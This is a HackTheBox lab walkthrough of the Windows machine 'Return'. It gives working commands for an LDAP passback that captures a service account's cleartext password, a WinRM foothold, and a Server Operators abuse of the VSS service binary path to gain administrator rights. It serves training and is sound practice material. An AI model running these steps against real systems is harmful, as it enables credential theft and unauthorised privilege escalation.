---
tags: [HTB, Return, Windows, ActiveDirectory, LDAPPassback, ServerOperators, ServiceAbuse, PrivilegeEscalation, Easy]
platform: HackTheBox
os: Windows Server 2019 Build 17763
hostname: PRINTER
domain: return.local
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Return, Full Walkthrough

## The gist

Return is a Windows domain controller hosting an unauthenticated printer administration panel. The settings form lets us replace the LDAP server address, so a raw listener on port 389 captures the service account's cleartext LDAP password. That account can use WinRM and belongs to Server Operators, allowing a temporary VSS service binary-path swap that runs a command as LocalSystem.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2019 |
| Hostname | PRINTER |
| Domain | $Domain |
| Difficulty | Easy |
| IP | $BoxIP |

## Variables

```bash
boxset BoxName Return
boxset BoxIP <target-ip>
boxset LocalIP <vpn-ip>
boxset BoxDir /home/kali/Platforms/HackTheBox/Return
boxset Domain return.local
boxset FQDN printer.return.local
boxset Username svc-printer
boxset Password <ldap-passback-cleartext>
boxset Port 389
boxset WebPort 80
```

Do not store real passwords, hashes, or flag values in a shared write-up.

## 1. Workspace setup

```bash
boxstart Return $BoxIP htb
htblog
```

Output confirmed `$LocalIP` on tun0 and the box directory at `$BoxDir`. `boxstart` created the standard folder structure (nmap/, loot/, exploits/, www/, screenshots/) and set all variables automatically. `htblog` added terminal output capture on top of the existing command log.

## 2. Full TCP scan

I scanned every TCP port because a domain controller exposes services that a default scan can miss.

```bash
sudo nmap -p- --min-rate 5000 -oA $BoxDir/nmap/Return_allports $BoxIP
```

Open ports included DNS (53), HTTP (80), Kerberos (88), RPC (135), NetBIOS (139), SMB (445), LDAP variants (636, 3268, 3269), WinRM (5985, 47001), ADWS (9389), and dynamic RPC. Classic Windows domain controller fingerprint. Port 80 alongside the expected DC services was the first thing to investigate.

![[return-01-all-ports.png]]

SCREENSHOT: Capture the completed all-port scan with the domain-controller service set visible.

## 3. Service and version scan

```bash
sudo nmap -sC -sV -p 53,80,88,135,139,445,464,593,636,3268,3269,5985,9389,47001 -oA $BoxDir/nmap/Return_services $BoxIP
```

Key findings were IIS 10.0 with the HTB Printer Admin Panel, LDAP for return.local, hostname PRINTER, Windows Server 2019 Build 17763, required SMB signing, and an 18-minute clock skew.

![[return-02-services.png]]

SCREENSHOT: Capture IIS, LDAP, SMB, WinRM, the hostname, and the domain.

## 4. Local setup

```bash
boxset Domain return.local
boxset FQDN printer.return.local
echo "$BoxIP $Domain $FQDN" | sudo tee -a /etc/hosts
```

The hosts-file update required local sudo authentication. I continued with the IP address and explicit HTTP requests.

## 5. Web enumeration

```bash
curl -s $BoxIP/ | tee $BoxDir/loot/index.html
curl -s $BoxIP/settings.php | tee $BoxDir/loot/settings.html
```

The homepage exposed Home, Settings, Fax, and Troubleshooting. Only Settings was a live non-home link.

The settings form contained:

```html
<form action="" method="POST">
  <input type="text" name="ip" value="printer.return.local"/>
  <input type="text" value="389"/>
  <input type="text" value="svc-printer"/>
  <input type="text" value="*******"/>
</form>
```

Only the LDAP server address had a name attribute. The port, username, and password were display-only fields. The server already knew those values and used them when it connected to LDAP.

> [!warning] 💡 Hint
> **Watch out:** A form can show several fields while posting only one. Check the HTML source and use the exact named field. Here, only ip is submitted, so posting another field gives a successful-looking HTTP response without triggering LDAP.

## 6. LDAP passback

I used a raw listener because the panel connects to LDAP, not SMB or HTTP.

```bash
nc -lvnp $Port
```

In another terminal:

```bash
curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
```

The listener received an LDAP Simple Bind containing the service account name and cleartext password. I stored it privately:

```bash
boxset Username svc-printer
boxset Password '<ldap-passback-password>'
loot cred $Username $Password
```

> [!warning] 💡 Hint
> **Watch out:** Use nc -lvnp 389, not Responder. This is LDAP passback. The service sends a raw LDAP Simple Bind over TCP, while Responder handles SMB and HTTP challenge responses.

> [!warning] 💡 Hint
> **Watch out:** If the password contains !, zsh history expansion can corrupt it. Store it with single quotes or load it from a protected file.

## 7. Credential validation

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
netexec winrm $BoxIP -u $Username -p $Password -d $Domain
```

SMB authentication succeeded. WinRM returned Pwn3d!, confirming an interactive shell.

## 8. WinRM foothold

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
```

Inside the shell:

```powershell
whoami
hostname
whoami /groups
whoami /priv
```

The important group was BUILTIN\Server Operators. Other memberships included Print Operators and Remote Management Users. SeBackupPrivilege, SeRestorePrivilege, and SeLoadDriverPrivilege were enabled, but Server Operators gave the direct route.

> [!tip] ⚡ More efficient path
> **What we did:** Validated SMB before checking whether WinRM was available.
>
> **Faster approach:**
> ```bash
> netexec winrm $BoxIP -u $Username -p $Password -d $Domain
> ```
> **Why:** A WinRM result showing Pwn3d! confirms that the credential can open a shell. This can remove a separate SMB validation step when WinRM is the objective.

![[return-03-foothold.png]]

SCREENSHOT: Capture the WinRM identity, Server Operators membership, and enabled privileges.

## 9. User flag

```powershell
Test-Path C:\Users\$Username\Desktop\user.txt
```

The result was True. The file contents were not read.

## 10. Service enumeration

Server Operators can control services. I looked for a demand-start service running as LocalSystem.

```powershell
sc.exe qc VSS
```

Relevant output:

```text
SERVICE_NAME: VSS
START_TYPE         : 3   DEMAND_START
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

VSS was a suitable target because it runs as LocalSystem and can be started on demand.

> [!tip] ⚡ More efficient path
> **What we did:** Checked several privilege-escalation paths before focusing on service control.
>
> **Faster approach:**
> ```powershell
> whoami /groups
> ```
> **Why:** Server Operators membership immediately suggests service-control abuse. Check groups before spending time on unrelated token or kernel techniques.

## 11. Service binary-path hijack

```powershell
sc.exe config VSS binPath= "cmd.exe /c net localgroup administrators $Username /add"
```

Output:

```text
[SC] ChangeServiceConfig SUCCESS
```

Started the service:

```powershell
sc.exe start VSS
```

Output:

```text
[SC] StartService FAILED 1053
The service did not respond to the start or control request in a timely fashion.
```

The error was expected because cmd.exe is not a proper service binary. The command still executed before Windows timed out.

> [!warning] 💡 Hint
> **Watch out:** Error 1053 does not mean the command failed. It means the launched process did not report the service-ready state. Check the intended effect instead.

I restored the service immediately:

```powershell
sc.exe config VSS binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc VSS
```

## 12. Verify the local administrator change

```powershell
net localgroup administrators
```

The output included $Username, confirming that the service command executed with LocalSystem privileges.

## 13. Reconnect for the new token

Group membership changes apply to new logon sessions only.

```powershell
exit
```

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
```

```powershell
whoami /groups
```

BUILTIN\Administrators appeared as an enabled group.

> [!warning] 💡 Hint
> **Watch out:** The current WinRM token does not refresh after a group membership change. Exit and reconnect before expecting Administrator rights.

## 14. Root flag

```powershell
Test-Path C:\Users\Administrator\Desktop\root.txt
```

The result was True. The file contents were not read.

![[return-04-admin-token.png]]

SCREENSHOT: Capture the refreshed Administrator group membership and root flag path check without exposing the flag.

## 15. Clean-down

I removed the temporary local Administrators membership and verified the remaining members.

```powershell
net localgroup administrators $Username /delete
net localgroup administrators
```

The account was absent from the final group listing.

```powershell
exit
```

```bash
boxdone
```

The helper was unavailable, so cleanup was verified manually. No accounts were created, no files were uploaded, and no persistence was added.

## Credentials

| Account | Source | Use |
|---|---|---|
| svc-printer | LDAP passback from the printer panel | WinRM foothold and Server Operators |
| Administrator | Local Administrator membership after service abuse | Privileged access |

Passwords and hashes are intentionally omitted.

## Key lessons

- Only named HTML form fields are submitted. Inspect the source before guessing POST parameters.
- LDAP passback uses a raw listener on port 389. Responder is the wrong tool for this path.
- Quote passwords containing ! in zsh to prevent history expansion.
- Error 1053 can still mean a service payload ran successfully.
- Server Operators membership can be more useful than apparently enabled backup privileges.
- Group membership changes require a new logon session.
- Restore a modified service binary path immediately after triggering it.
- A service running as LocalSystem can be abused to perform a privileged one-shot command.

## External Resources

- [HackTricks: Windows Service Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [HackTricks: LDAP Passback](https://book.hacktricks.wiki/en/pentesting/pentesting-ldap.html)
- [PayloadsAllTheThings: Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Microsoft: sc.exe config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)

## Checklist

- [x] Workspace setup
- [x] Full TCP scan
- [x] Service and version scan
- [x] Printer panel enumeration
- [x] LDAP passback
- [x] Credential validation
- [x] WinRM foothold
- [x] Server Operators enumeration
- [x] VSS service binary-path abuse
- [x] User and root flag path confirmation
- [x] Service restoration and membership cleanup

